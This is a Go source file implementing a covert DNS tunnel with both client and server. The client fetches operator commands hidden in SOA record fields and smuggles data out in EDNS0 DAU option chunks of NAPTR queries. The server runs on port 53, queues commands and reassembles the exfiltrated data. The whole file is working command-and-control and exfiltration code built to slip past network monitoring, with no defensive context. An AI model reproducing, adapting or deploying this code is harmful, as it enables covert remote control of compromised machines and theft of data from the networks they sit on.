package protocol

import (
	"bytes"
	"fmt"
	"strings"
	"time"

	"github.com/kek/pek/internal/codec"
	"github.com/miekg/dns"
)

type DauProtoClient struct {
	codec    codec.Codec[[]uint8]
	resolver string
	domain   string
	delay    time.Duration
}

func NewDauProtoClient(resolver string, domain string, delay time.Duration) *DauProtoClient {
	return &DauProtoClient{
		codec:    codec.NewDauCodec(),
		resolver: resolver,
		domain:   domain,
		delay:    delay,
	}
}

func (proto *DauProtoClient) FetchCmd() (string, error) {
	cmdResponse, err := proto.resolve(dns.TypeSOA, nil)
	if err != nil {
		return "", err
	}

	if len(cmdResponse) == 1 {
		if cmdRecord, ok := cmdResponse[0].(*dns.SOA); ok {
			decoded, err := proto.codec.DecodeCmd(cmdRecord.Ns)
			if err != nil {
				return "", fmt.Errorf("Unexpected content of SOA record")
			}

			return string(decoded), nil
		} else {
			return "", fmt.Errorf("Unexpected response instead of SOA record")
		}
	}

	return "", fmt.Errorf("Unexpected amount of DNS answers")
}

func (proto *DauProtoClient) Send(data []byte) error {
	encodedData := proto.codec.Encode(data)
	counter := 0
	for _, part := range encodedData {
		fmt.Printf("Sending: %v ... ", part)
		for {
			time.Sleep(proto.delay)

			answer, err := proto.resolve(dns.TypeNAPTR, part)
			if err != nil {
				continue
			}

			counter++

			if len(answer) > 0 {
				if record, ok := answer[0].(*dns.NAPTR); ok {
					if strings.Contains(record.Regexp, proto.codec.EncodeCmd(string(part))) {
						fmt.Printf("OK\n")
						break
					}

				}
			}
		}
	}
	fmt.Printf("Done in %d requests.\n\n", counter)

	return nil
}

func (proto *DauProtoClient) resolve(qtype uint16, dau []uint8) ([]dns.RR, error) {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(proto.domain), qtype)
	m.RecursionDesired = true

	if dau != nil {
		m.SetEdns0(4096, true)

		o := new(dns.OPT)
		o.Hdr.Name = "."
		o.Hdr.Rrtype = dns.TypeOPT
		e := new(dns.EDNS0_DAU)
		e.Code = dns.EDNS0DAU
		e.AlgCode = dau

		o.Option = append(o.Option, e)
		m.Extra = append(m.Extra, o)
	}

	c := &dns.Client{Timeout: 1 * time.Second}

	response, _, err := c.Exchange(m, proto.resolver)
	if err != nil {
		return nil, err
	}

	return response.Answer, nil
}

type DauProtoServer struct {
	codec     codec.Codec[[]uint8]
	cmd       string
	listening bool
	c         chan []uint8
}

func NewDauProtoServer() *DauProtoServer {
	return &DauProtoServer{
		codec: codec.NewDauCodec(),
		c:     make(chan []uint8, 10),
	}
}

func (proto *DauProtoServer) serverHandler(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	qtype := r.Question[0].Qtype
	switch qtype {
	case dns.TypeSOA:
		msg.Answer = append(msg.Answer, &dns.SOA{
			Hdr:     dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 0},
			Ns:      proto.codec.EncodeCmd(proto.cmd),
			Mbox:    "kek.pek.",
			Serial:  3,
			Refresh: 1,
			Retry:   3,
			Expire:  3,
			Minttl:  7,
		})

		if proto.cmd != "" {
			fmt.Println("Command received")
		}
	default:
		if edns := r.IsEdns0(); edns != nil {
			for _, opt := range edns.Option {
				if dau, ok := opt.(*dns.EDNS0_DAU); ok {
					chunk := dau.AlgCode

					if proto.listening {
						proto.c <- chunk
					}

					msg.Answer = append(msg.Answer, &dns.NAPTR{
						Hdr:    dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeNAPTR, Class: dns.ClassINET, Ttl: 0},
						Regexp: proto.codec.EncodeCmd(string(chunk)),
					})
				}
			}
		}

	}

	w.WriteMsg(msg)
}

func (proto *DauProtoServer) Serve() error {
	mux := dns.NewServeMux()
	mux.HandleFunc(".", proto.serverHandler)

	server := &dns.Server{
		Addr:    ":53",
		Net:     "udp",
		UDPSize: 512,
		Handler: mux,
	}

	return server.ListenAndServe()
}

func (proto *DauProtoServer) SendCmd(cmd string) {
	proto.cmd = cmd
}

func (proto *DauProtoServer) FetchData() []byte {
	proto.listening = true

	var buf [][]uint8
	for {
		part := <-proto.c
		if bytes.Equal(part, proto.codec.GetPrologue()) {
			fmt.Printf("Receiving data")
			buf = nil
		}

		buf = append(buf, part)
		fmt.Printf(".")

		if bytes.Equal(part, proto.codec.GetEpilogue()) {
			fmt.Printf("\n\n")

			decoded, err := proto.codec.Decode(buf)
			if err != nil {
				fmt.Printf("Error decoding response: %s", err)
			}

			proto.listening = false
			proto.cmd = ""
			return decoded
		}
	}
}
